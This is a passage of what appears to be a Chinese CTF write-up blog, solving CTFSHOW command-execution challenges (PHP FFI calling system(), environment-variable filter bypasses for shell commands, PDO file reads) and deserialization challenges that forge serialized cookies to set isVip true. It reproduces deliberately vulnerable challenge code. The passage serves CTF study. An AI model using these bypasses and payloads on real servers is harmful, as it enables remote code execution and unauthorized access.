class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h1 id="web76"><a href="#web76" class="headerlink" title="web76()"></a>web76()</h1><p>操作同上</p><p>paylaod：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h1 id="web77-FFI"><a href="#web77-FFI" class="headerlink" title="web77(FFI)"></a>web77(FFI)</h1><p>依旧是利用<code>glob://</code>读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>再利用PDO读取文件，发现mysql不让用了</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77.png" alt=""></p><p>这里直接用蚁剑连接，直接查看的话是不行</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77_01.png" alt=""></p><p>看了提示发现是个新特性，这里推荐一篇文章</p><ul><li><a href="https://www.php.cn/faq/415807.html">PHP7.4中FFI的介绍</a></li></ul><p>之前读的是<code>.txt</code>文件，这次改成<code>*</code>，发现如下文件</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77_02.png" alt=""></p><p>直接读flag文件读不了，考虑配合FFI使用<code>readflag</code>进行读取</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag&gt;/var/www/html/1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>执行完后访问1.txt拿到flag</p><h1 id="web118-系统变量"><a href="#web118-系统变量" class="headerlink" title="web118(系统变量)"></a>web118(系统变量)</h1><p>题目提示</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118_02.png" alt=""></p><p>打开后发现是一个可以输入的页面，查看源码发现提示</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118.png" alt=""></p><p>发现可以用通过输入指令来执行。尝试输入<code>whoami</code>，发现回显</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118_01.png" alt=""></p><p>发现存在过滤，可以利用fuzz大法跑，发现可以用<code>A-Z</code>和<code>$&#123;&#125;~.?:</code></p><p>就可以利用系统变量构造<code>nl</code>命令，根据题目提示发现flag在flag.php中，直接构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;<span class="variable">$IFS</span>????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl</span><br></pre></td></tr></table></figure><h1 id="web119"><a href="#web119" class="headerlink" title="web119()"></a>web119()</h1><p>发现如上界面，但是本题禁用了<code>$&#123;PATH</code></p><p>payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span></span><br><span class="line"><span class="comment"># pwd=/var/www/html</span></span><br><span class="line"><span class="comment"># USER=www-data</span></span><br><span class="line"><span class="comment"># payload即为 /???/?at ????.???</span></span><br><span class="line">为了构造/bin/cat </span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">也可以只要a进行构造</span><br><span class="line">$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><h1 id="web120"><a href="#web120" class="headerlink" title="web120()"></a>web120()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相当于把前两道题的源码给出来了</p><p>payload同上</p><p>`${PWD::$</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-反序列化</title>
      <link href="/2023/07/26/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/26/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web254"><a href="#web254" class="headerlink" title="web254()"></a>web254()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?username=xxxxxx&amp;password=xxxxxx</code></p><ul><li>看一边代码发现只需要让username和password值一样就行。</li><li>直接传参</li></ul><h1 id="web255"><a href="#web255" class="headerlink" title="web255()"></a>web255()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br><span class="line"></span><br><span class="line">Cookie</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>首先get依旧传入上题payload，但是本题多了一个Cookie的值。</li><li>根据题意，构建一个对象，且username和password值为xxxxxx，isVip的值应为true，才能依次执行上述功能</li><li>将序列化后的值传入发现无反应，试着将序列化内容url编码，结果成功！</li></ul><h1 id="web256"><a href="#web256" class="headerlink" title="web256()"></a>web256()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxxa</span><br><span class="line"></span><br><span class="line">Cookie user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>xxxxxxa%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>发现本题username和password不一样才可以输出flag</li><li>将构建的Cookie以及get中中username和password的值修改为不一样，即可输出flag</li></ul><h1 id="web257-POP链构造"><a href="#web257-POP链构造" class="headerlink" title="web257(POP链构造)"></a>web257(POP链构造)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span 